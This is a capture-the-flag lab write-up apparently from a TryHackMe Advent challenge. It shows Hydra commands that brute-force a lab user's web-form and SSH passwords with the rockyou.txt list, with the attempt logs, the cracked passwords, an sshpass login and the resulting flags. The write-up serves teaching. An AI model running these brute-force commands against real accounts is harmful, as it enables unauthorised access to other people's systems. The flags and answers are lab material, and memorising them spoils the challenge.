# [Day 17] Hydra-ha-ha-haa

## Instructions

You suspect Elf Molly is communicating with the Christmas Monster. Compromise her accounts by brute forcing them!

Use Hydra to brute force Elf Molly's password. Use the rockyou.txt password list, which can be found [here](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt).

Supporting materials can be found [here](https://blog.tryhackme.com/hydra/).

This machine will take between 3-4 minutes to boot.

## #1 - Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)

*Hint: If you've tried more than 30 passwords from RockYou.txt, you are doing something wrong!*

I'm not sure why the hint mentions that the password should be in the first 30 entries, because it was actually at line 905,678 of the rockyou.txt file :(

~~~
$ hydra -l molly -P rockyou.txt 10.10.112.172 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-03 18:56:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.112.172:80/login:username=^USER^&password=^PASS^&Login=Login:Your username or password is incorrect.
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "123456" - 1 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "12345" - 2 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "123456789" - 3 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "password" - 4 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "iloveyou" - 5 of 14344398 [child 4] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "princess" - 6 of 14344398 [child 5] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "1234567" - 7 of 14344398 [child 6] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "rockyou" - 8 of 14344398 [child 7] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "12345678" - 9 of 14344398 [child 8] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "abc123" - 10 of 14344398 [child 9] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "nicole" - 11 of 14344398 [child 10] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "daniel" - 12 of 14344398 [child 11] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "babygirl" - 13 of 14344398 [child 12] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "monkey" - 14 of 14344398 [child 13] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "lovely" - 15 of 14344398 [child 14] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "jessica" - 16 of 14344398 [child 15] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "654321" - 17 of 14344398 [child 0] (0/0)
...
[SNIP]
...
[80][http-post-form] host: 10.10.112.172   login: molly   password: joyness1994
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-03 19:06:06
~~~

When we connect with `molly` and `joyness1994` respectively for the username and password, we can see the flag:

~~~
THM{2673a7dd116de68e85c48ec0b1f2612e}
~~~

## #1 - Use Hydra to bruteforce molly's SSH password. What is flag 2?

~~~
$ hydra -l molly -P /data/downloads/rockyou.txt 10.10.112.172 -t 4 ssh -V
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-03 19:16:01
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://10.10.112.172:22/
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "123456" - 1 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "12345" - 2 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "123456789" - 3 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "password" - 4 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "iloveyou" - 5 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "princess" - 6 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "1234567" - 7 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "rockyou" - 8 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "12345678" - 9 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "abc123" - 10 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "nicole" - 11 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "daniel" - 12 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "babygirl" - 13 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "monkey" - 14 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "lovely" - 15 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "jessica" - 16 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "654321" - 17 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "michael" - 18 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "ashley" - 19 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "qwerty" - 20 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "111111" - 21 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "iloveu" - 22 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "000000" - 23 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "michelle" - 24 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "tigger" - 25 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "sunshine" - 26 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "chocolate" - 27 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "password1" - 28 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "soccer" - 29 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "anthony" - 30 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "friends" - 31 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.112.172 - login "molly" - pass "butterfly" - 32 of 14344398 [child 2] (0/0)
[22][ssh] host: 10.10.112.172   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-03 19:16:55
~~~

We find a valid password (`butterfly`) for user `molly`. Let's get the flag:

~~~
$ sshpass -p butterfly ssh molly@10.10.112.172 cat flag2.txt
THM{c8eeb0468febbadea859baeb33b2541b}
~~~